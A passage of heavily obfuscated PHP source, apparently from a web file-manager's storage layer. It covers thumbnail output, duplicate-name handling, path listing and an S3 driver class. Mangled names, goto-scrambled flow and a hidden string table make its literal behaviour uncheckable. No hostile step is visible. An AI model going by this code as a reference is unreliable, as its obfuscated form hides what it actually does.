fileOutImage($CƒïÏÌÛÃÚ, $B½¼ÙÁù = 250) { goto aÌ½ÔÔÄÊ©; dŒ‹Ù‡ª²: IO::fileOut($cÄ°£¤); goto e÷õ”­®È; dÓĞ…×ÌË¡: $CòŠ¸í‹Ú¥ = $a²Š¦ „ò[$Cµˆ’ˆÚåå[28]]; $b±˜¾¯ ¸ = !1; if (isset($GLOBALS[$Cµˆ’ˆÚåå[161]]) && $GLOBALS[$Cµˆ’ˆÚåå[161]][$Cµˆ’ˆÚåå[75]] == $a²Š¦ „ò[$Cµˆ’ˆÚåå[75]]) { $eïì´ÃåÒÍ = $GLOBALS[$Cµˆ’ˆÚåå[161]][$Cµˆ’ˆÚåå[162]]; if (!$a²Š¦ „ò[$Cµˆ’ˆÚåå[163]]) { $a²Š¦ „ò[$Cµˆ’ˆÚåå[163]] = $GLOBALS[$Cµˆ’ˆÚåå[161]]; } if (isset($eïì´ÃåÒÍ[$Cµˆ’ˆÚåå[164]])) { if ($eïì´ÃåÒÍ[$Cµˆ’ˆÚåå[164]] <= $B½¼ÙÁù && $eïì´ÃåÒÍ[$Cµˆ’ˆÚåå[165]] <= $B½¼ÙÁù) { $b±˜¾¯ ¸ = !0; } } $CòŠ¸í‹Ú¥ = $a²Š¦ „ò[$Cµˆ’ˆÚåå[163]][$Cµˆ’ˆÚåå[28]]; } goto e‚››‚œ‚; cÛöß¢ˆç: if (!($bœ‡Æ‘·Œ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Cµˆ’ˆÚåå[171]))) { $aÈ¡®Á„¶õ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Cµˆ’ˆÚåå[172]); } else { $aÈ¡®Á„¶õ = KodIO::make($bœ‡Æ‘·Œ); } if ($bœ‡Æ‘·Œ = IO::fileNameExist($aÈ¡®Á„¶õ, $E°ÚØë‘†)) { $B¨Şò·Üá‡ = KodIO::make($bœ‡Æ‘·Œ); return IO::fileOut($B¨Şò·Üá‡, !1, $CòŠ¸í‹Ú¥); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D©¯î¥„; aÌ½ÔÔÄÊ©: $Cµˆ’ˆÚåå =& $_SERVER[ÉóçÄÇ]; if (substr($CƒïÏÌÛÃÚ, 0, 4) == $Cµˆ’ˆÚåå[146]) { $this->fileOutLink($CƒïÏÌÛÃÚ); } $a²Š¦ „ò = $this->info($CƒïÏÌÛÃÚ); goto dÓĞ…×ÌË¡; D©¯î¥„: $B¨Şò·Üá‡ = DATA_THUMB . $E°ÚØë‘†; del_file($B¨Şò·Üá‡); if (!@file_exists($B¨Şò·Üá‡)) { $Bô»õÇÁØ˜ = TEMP_FILES; if (!is_dir($Bô»õÇÁØ˜)) { mk_dir($Bô»õÇÁØ˜); } $aŠÙÍéöºô = $Bô»õÇÁØ˜ . $aª“­õÓ…è . $Cµˆ’ˆÚåå[94] . $a²Š¦ „ò[$Cµˆ’ˆÚåå[167]]; if (!@file_exists($aŠÙÍéöºô)) { $aŠÙÍéöºô = $this->download($CƒïÏÌÛÃÚ, $aŠÙÍéöºô); } $Fƒè‚£ÑÔ© = new ImageThumb($aŠÙÍéöºô, $Cµˆ’ˆÚåå[173]); $Fƒè‚£ÑÔ©->prorate($B¨Şò·Üá‡, $B½¼ÙÁù, $B½¼ÙÁù * 10); } goto FÖ–ù¿Ü¥À; e‚››‚œ‚: if ($a²Š¦ „ò[$Cµˆ’ˆÚåå[77]] <= 1024 * 50 || $b±˜¾¯ ¸ || !function_exists($Cµˆ’ˆÚåå[166]) || $a²Š¦ „ò[$Cµˆ’ˆÚåå[167]] == $Cµˆ’ˆÚåå[168]) { return $this->fileOut($CƒïÏÌÛÃÚ, !1, $CòŠ¸í‹Ú¥); } if (isset($a²Š¦ „ò[$Cµˆ’ˆÚåå[163]][$Cµˆ’ˆÚåå[169]])) { $aª“­õÓ…è = $a²Š¦ „ò[$Cµˆ’ˆÚåå[163]][$Cµˆ’ˆÚåå[169]]; } else { if (isset($a²Š¦ „ò[$Cµˆ’ˆÚåå[163]][$Cµˆ’ˆÚåå[170]])) { $aª“­õÓ…è = $a²Š¦ „ò[$Cµˆ’ˆÚåå[163]][$Cµˆ’ˆÚåå[170]]; } else { $aª“­õÓ…è = md5("{$a²Š¦ „ò[$Cµˆ’ˆÚåå[28]]}\x5f{$a²Š¦ „ò[$Cµˆ’ˆÚåå[75]]}\137{$a²Š¦ „ò[$Cµˆ’ˆÚåå[77]]}"); } } $E°ÚØë‘† = "{$aª“­õÓ…è}\x5f{$B½¼ÙÁù}\56\160\156\x67"; goto cÛöß¢ˆç; FÖ–ù¿Ü¥À: if (!file_exists($B¨Şò·Üá‡) || filesize($B¨Şò·Üá‡) < 100) { return @file_exists($aŠÙÍéöºô) ? IO::fileOut($aŠÙÍéöºô) : $this->fileOut($CƒïÏÌÛÃÚ); } if (!($cÄ°£¤ = IO::move($B¨Şò·Üá‡, $aÈ¡®Á„¶õ))) { return IO::fileOut($B¨Şò·Üá‡); } del_file($B¨Şò·Üá‡); goto dŒ‹Ù‡ª²; e÷õ”­®È: } public function fileOutImageServer($DêïÂÚ¸Ó, $Aé©ÁçÇå« = 250) { $this->fileOutImage($DêïÂÚ¸Ó, $Aé©ÁçÇå«); } public function fileNameAuto($CèË±‰¨‚, $f†‚‹Ï¡É‘, $a¤“¹ƒ¯“ = REPEAT_RENAME, $f„öœ¤ÄÆ¾ = false) { goto B§å–»Ç·Ñ; B§å–»Ç·Ñ: $eŠµãƒ–»Ì =& $_SERVER[ÉóçÄÇ]; $f÷ÑÆ´¿ğ¯ = $CèË±‰¨‚ === $eŠµãƒ–»Ì[33] ? $f†‚‹Ï¡É‘ : rtrim($CèË±‰¨‚, $eŠµãƒ–»Ì[8]) . $eŠµãƒ–»Ì[8] . $f†‚‹Ï¡É‘; if ($a¤“¹ƒ¯“ == REPEAT_REPLACE || !$this->exist($f÷ÑÆ´¿ğ¯) || $f„öœ¤ÄÆ¾ && $a¤“¹ƒ¯“ != REPEAT_RENAME_FOLDER) { return $f†‚‹Ï¡É‘; } goto fÈ¥ªèó‡; cò¿œºÑŠí: while ($this->exist(rtrim($CèË±‰¨‚, $eŠµãƒ–»Ì[8]) . $eŠµãƒ–»Ì[8] . $Aä—¨íšà)) { $Aä—¨íšà = $dò÷ˆ†õÍË . "\50{$d“·ó«½¥­}\x29{$a§â·íá}"; $d“·ó«½¥­++; } return $Aä—¨íšà; goto d§¾Å†×ß·; Eã¼•ğ¤ëê: $d“·ó«½¥­ = 1; $dò÷ˆ†õÍË = substr($f†‚‹Ï¡É‘, 0, strlen($f†‚‹Ï¡É‘) - strlen($a§â·íá)); $Aä—¨íšà = $dò÷ˆ†õÍË . "\x28{$d“·ó«½¥­}\51{$a§â·íá}"; goto cò¿œºÑŠí; fÈ¥ªèó‡: if ($a¤“¹ƒ¯“ == REPEAT_SKIP) { return !1; } $a§â·íá = $eŠµãƒ–»Ì[94] . get_path_ext($f†‚‹Ï¡É‘); $a§â·íá = $a§â·íá == $eŠµãƒ–»Ì[94] || $f„öœ¤ÄÆ¾ ? $eŠµãƒ–»Ì[33] : $a§â·íá; goto Eã¼•ğ¤ëê; d§¾Å†×ß·: } private function fileNameAutoList($böÉëàÅ¤â, $AéğõÜÈĞ–, $C•õãª¦…¡ = false) { goto EÖÁ°Ûô¸Ç; EôÉäÕÖà¿: $eŠ¼ÃÓ¥Å = substr($AéğõÜÈĞ–, 0, strlen($AéğõÜÈĞ–) - strlen($E‡âÄøÆ)); $CŒ±¦‹•Ûø = $eŠ¼ÃÓ¥Å . "\x28\x30\x29{$E‡âÄøÆ}"; for ($e³ïï½‚Ë© = 1; $e³ïï½‚Ë© <= count($d»Î°“Œ) + 1; $e³ïï½‚Ë©++) { $CŒ±¦‹•Ûø = $eŠ¼ÃÓ¥Å . "\x28{$e³ïï½‚Ë©}\51{$E‡âÄøÆ}"; if (!in_array_not_case($CŒ±¦‹•Ûø, $d»Î°“Œ)) { return $CŒ±¦‹•Ûø; } } goto eµç¢´Áìß; EÖÁ°Ûô¸Ç: $dŸñ…¦†« =& $_SERVER[ÉóçÄÇ]; $Bğ«‹¾Ÿ¸ö = $this->listPath($böÉëàÅ¤â, !0); $Bğ«‹¾Ÿ¸ö = array_merge($Bğ«‹¾Ÿ¸ö[$dŸñ…¦†«[74]], $Bğ«‹¾Ÿ¸ö[$dŸñ…¦†«[73]]); goto EÜ”øÒØÆ; eµç¢´Áìß: return $CŒ±¦‹•Ûø; goto EîàÙ¯Å; EÜ”øÒØÆ: $d»Î°“Œ = array_to_keyvalue($Bğ«‹¾Ÿ¸ö, $dŸñ…¦†«[33], $dŸñ…¦†«[28]); $E‡âÄøÆ = $dŸñ…¦†«[94] . get_path_ext($AéğõÜÈĞ–); $E‡âÄøÆ = $E‡âÄøÆ == $dŸñ…¦†«[94] || $C•õãª¦…¡ ? $dŸñ…¦†«[33] : $E‡âÄøÆ; goto EôÉäÕÖà¿; EîàÙ¯Å: } public function listAllFiles($eËãŠ­†š, $AÚ…Ù¢œ˜Ê, $Fö¨âÆö„ = array()) { goto aˆ‹¬áÏ²; EäÚÌöñ›¤: $eËãŠ­†š = trim($eËãŠ­†š, $AáÆºÎêÈê[8]); foreach ($AÚ…Ù¢œ˜Ê as $e‘ÄÍÃ†¤¨) { $c‚º·‚Õ¨ = ltrim(substr(trim($e‘ÄÍÃ†¤¨, $AáÆºÎêÈê[8]), strlen($eËãŠ­†š)), $AáÆºÎêÈê[8]); $bÍœ¯¤ï»„ = array_merge($bÍœ¯¤ï»„, $this->slicePath($c‚º·‚Õ¨)); } $d‡ÄœŞëŞ’ = array(); goto bÒ‰ƒ„µî; aˆ‹¬áÏ²: $AáÆºÎêÈê =& $_SERVER[ÉóçÄÇ]; if (empty($AÚ…Ù¢œ˜Ê)) { return array(); } $bÍœ¯¤ï»„ = array(); goto EäÚÌöñ›¤; bÒ‰ƒ„µî: foreach (array_unique($bÍœ¯¤ï»„) as $e‘ÄÍÃ†¤¨) { $Eé²Š´£ÓØ = array($AáÆºÎêÈê[75] => $this->getPathOuter($AáÆºÎêÈê[8] . $eËãŠ­†š . $AáÆºÎêÈê[8] . $e‘ÄÍÃ†¤¨), $AáÆºÎêÈê[76] => 1, $AáÆºÎêÈê[77] => 0); if (substr($e‘ÄÍÃ†¤¨, -1) != $AáÆºÎêÈê[8]) { $Eé²Š´£ÓØ[$AáÆºÎêÈê[76]] = 0; $fÔ¸…óöµ¨ = $this->getPath($eËãŠ­†š . $AáÆºÎêÈê[8] . $e‘ÄÍÃ†¤¨); $Eé²Š´£ÓØ[$AáÆºÎêÈê[77]] = isset($Fö¨âÆö„[$fÔ¸…óöµ¨]) ? $Fö¨âÆö„[$fÔ¸…óöµ¨] : $this->size($fÔ¸…óöµ¨); } $d‡ÄœŞëŞ’[] = $Eé²Š´£ÓØ; } return $d‡ÄœŞëŞ’; goto a°ãàí“; a°ãàí“: } public function slicePath($dÏô‹õÜíÜ) { $a’Ùà¤İ´Œ =& $_SERVER[ÉóçÄÇ]; $b–­µ‚ä¹¶ = explode($a’Ùà¤İ´Œ[8], trim($dÏô‹õÜíÜ, $a’Ùà¤İ´Œ[8])); $fçöº¾Î’Ù = 0; do { ++$fçöº¾Î’Ù; $cìƒÚ™…¹[] = implode($a’Ùà¤İ´Œ[8], array_slice($b–­µ‚ä¹¶, 0, $fçöº¾Î’Ù)) . $a’Ùà¤İ´Œ[8]; } while ($fçöº¾Î’Ù < count($b–­µ‚ä¹¶)); $cìƒÚ™…¹[count($b–­µ‚ä¹¶) - 1] = $dÏô‹õÜíÜ; return $cìƒÚ™…¹; } public function getHost() { $F”øãŸ¨ˆ© =& $_SERVER[ÉóçÄÇ]; $c›ÍÄäº = parse_url(trim($this->domain, $F”øãŸ¨ˆ©[8])); $BÃ®°²å”Ô = isset($c›ÍÄäº[$F”øãŸ¨ˆ©[174]]) ? $c›ÍÄäº[$F”øãŸ¨ˆ©[174]] : http_type(); $D×®â‰…Ü = isset($c›ÍÄäº[$F”øãŸ¨ˆ©[175]]) ? $c›ÍÄäº[$F”øãŸ¨ˆ©[175]] : $c›ÍÄäº[$F”øãŸ¨ˆ©[75]]; if (isset($c›ÍÄäº[$F”øãŸ¨ˆ©[176]])) { $D×®â‰…Ü .= $F”øãŸ¨ˆ©[4] . $c›ÍÄäº[$F”øãŸ¨ˆ©[176]]; } return $BÃ®°²å”Ô . $F”øãŸ¨ˆ©[177] . $D×®â‰…Ü; } public function pathEncode($Dç÷†â…¹Ì) { $b·Ş¼šƒ»„ =& $_SERVER[ÉóçÄÇ]; return str_replace($b·Ş¼šƒ»„[178], $b·Ş¼šƒ»„[8], rawurlencode($Dç÷†â…¹Ì)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($d Àì¤æÕ¨) { set_timeout(); require_once SDK_DIR . $_SERVER[ÉóçÄÇ][179]; parent::__construct(); $this->_init($d Àì¤æÕ¨); } public function _init($Eï›‰„Øç) { foreach ($Eï›‰„Øç as $d˜Şö“ñèË => $f«ôõõÒ×œ) { if (isset($this->{$d˜Şö“ñèË})) { $this->{$d˜Şö“ñèË} = $f«ôõõÒ×œ; } } $this->endpoint = $Eï›‰„Øç[$_SERVER[ÉóçÄÇ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($BÑ×Š˜ˆê = "\166\x34") { $this->signVer = $BÑ×Š˜ˆê; $this->client->setSignatureVersion($BÑ×Š˜ˆê); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f‹—»ÉŒ¶³; f‹—»ÉŒ¶³: $a¿ÂÊË¿øÓ =& $_SERVER[ÉóçÄÇ]; $dãø×½éÌ = $this->getBucketCors(); if (!$dãø×½éÌ || !is_array($dãø×½éÌ)) { return !1; } goto AÔë²­Œ»; AÔë²­Œ»: if ($dãø×½éÌ[$a¿ÂÊË¿øÓ[181]] != $a¿ÂÊË¿øÓ[182] || $dãø×½éÌ[$a¿ÂÊË¿øÓ[183]] != $a¿ÂÊË¿øÓ[182]) { return !1; } $D·…°øßÑÎ = array_map($a¿ÂÊË¿øÓ[184], $dãø×½éÌ[$a¿ÂÊË¿øÓ[185]]); if (!is_array($D·…°øßÑÎ)) { $D·…°øßÑÎ = array(); } goto fØî‹”—Œ; fØî‹”—Œ: $Cæ‹„Î™° = array($a¿ÂÊË¿øÓ[186], $a¿ÂÊË¿øÓ[187], $a¿ÂÊË¿øÓ[188], $a¿ÂÊË¿øÓ[189], $a¿ÂÊË¿øÓ[190]); $F™ñÇ°“†¬ = array_diff($Cæ‹„Î™°, $D·…°øßÑÎ); return empty($F™ñÇ°“†¬); goto DŠ ”º—•Â; DŠ ”º—•Â: } public function mkfile($Dê–àÁ©ï–, $aÆ¬šïİµŒ = '', $EòŸŒ½Ìîğ = REPEAT_RENAME) { $D‹ƒ„ƒ¶Ñ£ = $this->setContent($Dê–àÁ©ï–, $aÆ¬šïİµŒ); if ($D‹ƒ„ƒ¶Ñ£ !== !1) { return $this->getPathOuter($Dê–àÁ©ï–); } return !1; } public function mkdir($Cº·•²Üà, $FÄÆÎ˜ã°Õ = REPEAT_SKIP) { if (empty($Cº·•²Üà)) { return !1; } if ($this->_isFolder($Cº·•²Üà)) { return $this->getPathOuter($Cº·•²Üà); } $f¹²ºÈŒ—¦ = $this->setContent($Cº·•²Üà, $_SERVER[ÉóçÄÇ][33], !0); if ($f¹²ºÈŒ—¦ !== !1) { return $this->getPathOuter($Cº·•²Üà); } return !1; } public function copyFile($FÈŒ†Ÿ›ê, $DÜ­¿²´õŞ, $AÍ„ª­Ñš¬ = array()) { $CŸÉè•äÌâ =& $_SERVER[ÉóçÄÇ]; $d³±ğŞ‹­ = $this->objectMeta($FÈŒ†Ÿ›ê); if (!$d³±ğŞ‹­) { return !1; } if ($d³±ğŞ‹­[$CŸÉè•äÌâ[77]] <= 1024 * 1024 * 200) { $eà²›‘Ã«« = $this->client->copyObject($this->bucket, $FÈŒ†Ÿ›ê, $this->bucket, $DÜ­¿²´õŞ, $CŸÉè•äÌâ[191], $AÍ„ª­Ñš¬); } else { $eà²›‘Ã«« = $this->client->multiCopyObject($this->bucket, $FÈŒ†Ÿ›ê, $this->bucket, $DÜ­¿²´õŞ, $AÍ„ª­Ñš¬); } $eà²›‘Ã«« = $eà²›‘Ã«« ? $this->getPathOuter($DÜ­¿²´õŞ) : !1; return $eà²›‘Ã««; } public function moveFile($B·Î©Õ³‡à, $a‹éšƒ‰”) { if ($this->copyFile($B·Î©Õ³‡à, $a‹éšƒ‰”)) { $this->delFile($B·Î©Õ³‡à); return $this->getPathOuter($a‹éšƒ‰”); } return !1; } public function delFile($fÂ‚ª¦»¦) { return $this->client->deleteObject($this->bucket, $fÂ‚ª¦»¦); } public function delFolder($E‡¨£éëÏ³) { goto Ağ…Úöˆ; F•Èä”óÌ×: return $this->delByBatch($EÒ½Õ°‰‚¥[$eÄëÖßæíç[74]]); goto Cæ½˜ÒŠ´–; Ağ…Úöˆ: $eÄëÖßæíç =& $_SERVER[ÉóçÄÇ]; if (!$this->exist($E‡¨£éëÏ³)) { return !0; } $this->listItemCache = !1; goto A®¹ƒ§µÉ±; A®¹ƒ§µÉ±: $EÒ½Õ°‰‚¥ = $this->fileList($E‡¨£éëÏ³); $this->listItemCache = !0; $FêˆÎ©„à = trim($E‡¨£éëÏ³, $eÄëÖßæíç[8]) . $eÄëÖßæíç[8]; goto AØÚ²‹åİ; AØÚ²‹åİ: if (!empty($E‡¨£éëÏ³) && !in_array($FêˆÎ©„à, $EÒ½Õ°‰‚¥[$eÄëÖßæíç[74]])) { $EÒ½Õ°‰‚¥[$eÄëÖßæíç[74]][] = $FêˆÎ©„à; } $cÚ¸Õõ¹— = $this->delByBatch($EÒ½Õ°‰‚¥[$eÄëÖßæíç[73]]); if (!$cÚ¸Õõ¹—) { return !1; } goto F•Èä”óÌ×; Cæ½˜ÒŠ´–: } private function delByBatch($b’¥À—„èÉ) { foreach (array_chunk($b’¥À—„èÉ, 1000) as $c—¡²ŒŠì) { $bÍóÙœÌö = $this->client->deleteObjects($this->bucket, $c—¡²ŒŠì); if (!$bÍóÙœÌö) { return !1; } } return !0; } public function rename($dìÎ‰Ğ±ì‰, $CÛœ¥‡¼Î‡) { return $this->renameObject($dìÎ‰Ğ±ì‰, $CÛœ¥‡¼Î‡); } public function listPath($C§Ç§’ãÀÆ, $bæ¯´¾ÁŠ = false) { $F»¡œÀÉ … =& $_SERVER[ÉóçÄÇ]; $A”¨©äğ×¸ = $this->fileList($C§Ç§’ãÀÆ, $F»¡œÀÉ …[8], !0); foreach ($A”¨©äğ×¸[$F»¡œÀÉ …[74]] as $bÚÅùã Â÷ => $F„¥“Üµó) { $A”¨©äğ×¸[$F»¡œÀÉ …[74]][$bÚÅùã Â÷] = $this->folderInfo($F„¥“Üµó, $bæ¯´¾ÁŠ); } foreach ($A”¨©äğ×¸[$F»¡œÀÉ …[73]] as $bÚÅùã Â÷ => $F„¥“Üµó) { $A”¨©äğ×¸[$F»¡œÀÉ …[73]][$bÚÅùã Â÷] = $this->fileInfo($F„¥“Üµó[$F»¡œÀÉ …[28]], $bæ¯´¾ÁŠ, $F„¥“Üµó); } return $A”¨©äğ×¸; } private function fileInfo($f‰òÄñ»‡, $BŒˆ©ºÒ¾ó = false, $fİœ¼Ü—¡õ = array()) { goto c¡å…¼ø×; c¡å…¼ø×: $A³‰Ô ·«¥ =& $_SERVER[ÉóçÄÇ]; $C«º¦Ÿé = array($A³‰Ô ·«¥[28] => $this->pathThis($f‰òÄñ»‡), $A³‰Ô ·«¥[75] => $this->getPathOuter($f‰òÄñ»‡), $A³‰Ô ·«¥[29] => $A³‰Ô ·«¥[173], $A³‰Ô ·«¥[167] => $this->ext($f‰òÄñ»‡), $A³‰Ô ·«¥[77] => isset($fİœ¼Ü—¡õ[$A³‰Ô ·«¥[77]]) ? $fİœ¼Ü—¡õ[$A³‰Ô ·«¥[77]] : 0); if ($BŒˆ©ºÒ¾ó) { return $C«º¦Ÿé; } goto FóÒŒ­ğé; E©‡‚¯‚: if (isset($fİœ¼Ü—¡õ[$A³‰Ô ·«¥[195]])) { $C«º¦Ÿé[$A³‰Ô ·«¥[83]] = $fİœ¼Ü—¡õ[$A³‰Ô ·«¥[195]]; } if (isset($fİœ¼Ü—¡õ[$A³‰Ô ·«¥[77]])) { $C«º¦Ÿé[$A³‰Ô ·«¥[77]] = $fİœ¼Ü—¡õ[$A³‰Ô ·«¥[77]]; } return $C«º¦Ÿé; goto EâÈƒ¸Ëã‡; FóÒŒ­ğé: $C«º¦Ÿé[$A³‰Ô ·«¥[192]] = $C«º¦Ÿé[$A³‰Ô ·«¥[83]] = 0; $C«º¦Ÿé[$A³‰Ô ·«¥[193]] = $C«º¦Ÿé[$A³‰Ô ·«¥[194]] = !0; if (empty($fİœ¼Ü—¡õ)) { $fİœ¼Ü—¡õ = $this->objectMeta($f‰òÄñ»‡); if (!$fİœ¼Ü—¡õ) { return $C«º¦Ÿé; } } goto E©‡‚¯‚; EâÈƒ¸Ëã‡: } private function folderInfo($FÎÆ…Ø²ñµ, $fó£­–³ÍÊ = false) { goto cåÂÏ‹Ò’; cåÂÏ‹Ò’: $Dš„¿‡Û  =& $_SERVER[ÉóçÄÇ]; $D†ø£¤ = array($Dš„¿‡Û [28] => $this->pathThis($FÎÆ…Ø²ñµ), $Dš„¿‡Û [75] => $this->getPathOuter($Dš„¿‡Û [8] . $FÎÆ…Ø²ñµ), $Dš„¿‡Û [29] => $Dš„¿‡Û [76]); if ($fó£­–³ÍÊ) { return $D†ø£¤; } goto f®›ÔŞ…®; A–—å±‡óô: return $D†ø£¤; goto CœÇ“‚¯á‚; f®›ÔŞ…®: $D†ø£¤[$Dš„¿‡Û [192]] = $D†ø£¤[$Dš„¿‡Û [83]] = 0; $D†ø£¤[$Dš„¿‡Û [193]] = $D†ø£¤[$Dš„¿‡Û [194]] = !0; if ($FÎÆ…Ø²ñµ == $Dš„¿‡Û [33]) { return $D†ø£¤; } goto aÈÅ‚ÎÙÈğ; aÈÅ‚ÎÙÈğ: $FÎÆ…Ø²ñµ = trim($FÎÆ…Ø²ñµ, $Dš„¿‡Û [8]) . $Dš„¿‡Û [8]; $b¦¢‰Ÿ†† = $this->objectMeta($FÎÆ…Ø²ñµ); if (isset($b¦¢‰Ÿ††[$Dš„¿‡Û [195]])) { $D†ø£¤[$Dš„¿‡Û [192]] = $b¦¢‰Ÿ††[$Dš„¿‡Û [195]]; } goto A–—å±‡óô; CœÇ“‚¯á‚: } private function fileList($D„ŞğÍ¢äĞ, $B‘Ù¼¾¿Ğ® = '', $e‡‘ÌÚ¬å = 0) { goto dÉùÄƒ¿¦›; B½¼Ş×§¡: if (!$eù¸¿ÉšõÚ) { return array($c¹…Áğğß¾[74] => array(), $c¹…Áğğß¾[73] => array()); } $fŒïê©„¾ì = $this->listItemCache === !1 ? !1 : !0; $aÄÍ±±³µ = $C«ƒƒºÌ°Î = array(); goto FŠâÔ ·£œ; dÉùÄƒ¿¦›: $c¹…Áğğß¾ =& $_SERVER[ÉóçÄÇ]; $e‡˜ÚÜ‹”¿ = rtrim($D„ŞğÍ¢äĞ, $c¹…Áğğß¾[8]) . $c¹…Áğğß¾[8]; $eù¸¿ÉšõÚ = $this->listObjs($e‡˜ÚÜ‹”¿, null, null, $B‘Ù¼¾¿Ğ®); goto B½¼Ş×§¡; FŠâÔ ·£œ: foreach ($eù¸¿ÉšõÚ[$c¹…Áğğß¾[196]] as $f›ŸÉ¨ŞáÍ) { goto eÍÓ·¼–á; Cò¶¨É›é: $C«ƒƒºÌ°Î[] = $e‡‘ÌÚ¬å ? $f›ŸÉ¨ŞáÍ : $dïØ À—«; goto bÚîëáË; dîì£´‚ê: $Fã²Öğë“ = $b±›Ü¼òÛ­ == 0 && substr($dïØ À—«, strlen($dïØ À—«) - 1, 1) == $c¹…Áğğß¾[8] ? !0 : !1; if ($fŒïê©„¾ì) { $this->cacheMethod($c¹…Áğğß¾[197], $dïØ À—«, $Fã²Öğë“); $this->cacheMethod($c¹…Áğğß¾[198], $dïØ À—«, $f›ŸÉ¨ŞáÍ); } if ($Fã²Öğë“) { $aÄÍ±±³µ[] = $dïØ À—«; continue; } goto Cò¶¨É›é; eÍÓ·¼–á: $dïØ À—« = $f›ŸÉ¨ŞáÍ[$c¹…Áğğß¾[28]]; if ($dïØ À—« == $e‡˜ÚÜ‹”¿) { continue; } $b±›Ü¼òÛ­ = isset($f›ŸÉ¨ŞáÍ[$c¹…Áğğß¾[77]]) ? $f›ŸÉ¨ŞáÍ[$c¹…Áğğß¾[77]] : 0; goto dîì£´‚ê; bÚîëáË: } foreach ($eù¸¿ÉšõÚ[$c¹…Áğğß¾[199]] as $f›ŸÉ¨ŞáÍ) { $aÄÍ±±³µ[] = $f›ŸÉ¨ŞáÍ[$c¹…Áğğß¾[28]]; if ($fŒïê©„¾ì) { $this->cacheMethod($c¹…Áğğß¾[197], $f›ŸÉ¨ŞáÍ[$c¹…Áğğß¾[28]], !0); } } if ($fŒïê©„¾ì) { $this->cacheMethod($c¹…Áğğß¾[197], $D„ŞğÍ¢äĞ, !0); } goto CÂÀ•†øÍô; CÂÀ•†øÍô: return array($c¹…Áğğß¾[74] => $aÄÍ±±³µ, $c¹…Áğğß¾[73] => $C«ƒƒºÌ°Î); goto F²³Éæ”íò; F²³Éæ”íò: } private function listObjs($aÇíÚòä‰Å, $EµÀ«™˜Ÿ = null, $c…ìœ¯† = null, $DÎ»®ºõ = null) { $cÓÕ ¼Ì¹„ =& $_SERVER[ÉóçÄÇ]; $aÇíÚòä‰Å = trim($aÇíÚòä‰Å, $cÓÕ ¼Ì¹„[8]); $DôÓ“ —× = empty($aÇíÚòä‰Å) ? $cÓÕ ¼Ì¹„[33] : $aÇíÚòä‰Å . $cÓÕ ¼Ì¹„[8]; return $this->client->getBucket($this->bucket, $DôÓ“ —×, $EµÀ«™˜Ÿ, $c…ìœ¯†, $DÎ»®ºõ, !0); } public function has($C˜Ûğç‰´, $D°¹šÑĞÊ = false, $FÑÈ£”¶ñ = true) { goto Fê¡Œì±; E‰°—Ä˜È: $AÏ’Ö¯ï‡— = null; $e‡ÆŒÑ¡ì = 500; $FğÖÊ”ÄŞ = $e„ëÛ‹¨[8]; goto DéãâŒÁ¥; DéãâŒÁ¥: $e—ÕÄ ¯¸Î = $Dš’‘Œœœ = array(); while (!0) { $cÖšò–‘åÍ = $this->listObjs($C˜Ûğç‰´, $AÏ’Ö¯ï‡—, $e‡ÆŒÑ¡ì, $FğÖÊ”ÄŞ); if (!$cÖšò–‘åÍ) { break; } $AÏ’Ö¯ï‡— = $cÖšò–‘åÍ[$e„ëÛ‹¨[200]]; $A¶†£Ìáæø = $cÖšò–‘åÍ[$e„ëÛ‹¨[196]]; $aìˆÚ·ÀÎ¡ = $cÖšò–‘åÍ[$e„ëÛ‹¨[199]]; if (empty($A¶†£Ìáæø) && empty($aìˆÚ·ÀÎ¡)) { break; } if (count($A¶†£Ìáæø) == 1 && $A¶†£Ìáæø[0][$e„ëÛ‹¨[28]] == $Dë´éĞÁä¼) { break; } if ($D°¹šÑĞÊ) { if (count($A¶†£Ìáæø)) { $A¶†£Ìáæø = array_column($A¶†£Ìáæø, $e„ëÛ‹¨[28]); $e—ÕÄ ¯¸Î = array_merge($e—ÕÄ ¯¸Î, $A¶†£Ìáæø); } if (count($aìˆÚ·ÀÎ¡)) { $aìˆÚ·ÀÎ¡ = array_column($aìˆÚ·ÀÎ¡, $e„ëÛ‹¨[28]); $Dš’‘Œœœ = array_merge($Dš’‘Œœœ, $aìˆÚ·ÀÎ¡); } if ($AÏ’Ö¯ï‡— === null) { break; } continue; } if ($FÑÈ£”¶ñ) { if (!empty($A¶†£Ìáæø)) { if (count($A¶†£Ìáæø) > 1 || isset($A¶†£Ìáæø[0][$e„ëÛ‹¨[28]]) && $A¶†£Ìáæø[0][$e„ëÛ‹¨[28]] != $Dë´éĞÁä¼) { return !0; } } } else { if (!empty($aìˆÚ·ÀÎ¡)) { return !0; } } if ($AÏ’Ö¯ï‡— === null) { break; } } if ($D°¹šÑĞÊ) { $e—ÕÄ ¯¸Î = array_diff($e—ÕÄ ¯¸Î, array($Dë´éĞÁä¼)); $e—ÕÄ ¯¸Î = count(array_unique($e—ÕÄ ¯¸Î)); $Dš’‘Œœœ = count(array_unique($Dš’‘Œœœ)); return array($e„ëÛ‹¨[201] => $e—ÕÄ ¯¸Î, $e„ëÛ‹¨[202] => $Dš’‘Œœœ); } goto DëÁÒÓéÄè; DëÁÒÓéÄè: return !1; goto e‘ƒĞ‚Øêš; Fê¡Œì±: $e„ëÛ‹¨ =& $_SERVER[ÉóçÄÇ]; $C˜Ûğç‰´ = trim($C˜Ûğç‰´, $e„ëÛ‹¨[8]); $Dë´éĞÁä¼ = empty($C˜Ûğç‰´) ? $e„ëÛ‹¨[33] : $C˜Ûğç‰´ . $e„ëÛ‹¨[8]; goto E‰°—Ä˜È; e‘ƒĞ‚Øêš: } public function listAll($cğ–Ê¯¼ôö) { $aö×´æà³› =& $_SERVER[ÉóçÄÇ]; $fÆ“„òÂ’ˆ = $this->fileList($cğ–Ê¯¼ôö, $aö×´æà³›[33], !0); $cÎÚŠ–Ô«Ş = array(); foreach 